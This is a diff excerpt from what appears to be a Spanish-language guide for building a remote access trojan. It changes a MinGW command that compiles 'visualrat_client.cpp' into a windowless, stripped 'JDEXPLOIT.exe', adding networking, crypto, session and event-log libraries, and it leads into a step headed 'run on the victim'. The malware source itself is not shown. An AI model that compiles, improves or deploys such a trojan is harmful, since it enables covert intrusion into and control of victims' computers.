@@ -163,7 +163,7 @@ x86_64-w64-mingw32-g++ -o JDEXPLOIT.exe visualrat_client.cpp \
 
 ### **3. Compilar (en Windows con PowerShell):**
 ```powershell
-x86_64-w64-mingw32-g++ -o JDEXPLOIT.exe visualrat_client.cpp -static -static-libgcc -static-libstdc++ -s -O2 -mwindows -lws2_32 -liphlpapi -ladvapi32 -lshlwapi -luser32 -lgdi32 -lpsapi
+x86_64-w64-mingw32-g++ -o JDEXPLOIT.exe visualrat_client.cpp -static -static-libgcc -static-libstdc++ -s -O2 -mwindows -lws2_32 -liphlpapi -ladvapi32 -lshlwapi -luser32 -lgdi32 -lpsapi -lwinhttp -lcrypt32 -lwtsapi32 -lwevtapi -lntdll -lcomctl32 -lcomdlg32 -lgdiplus -lole32 -loleaut32
 ```
 
 ### **4. Ejecutar en la víctima:**
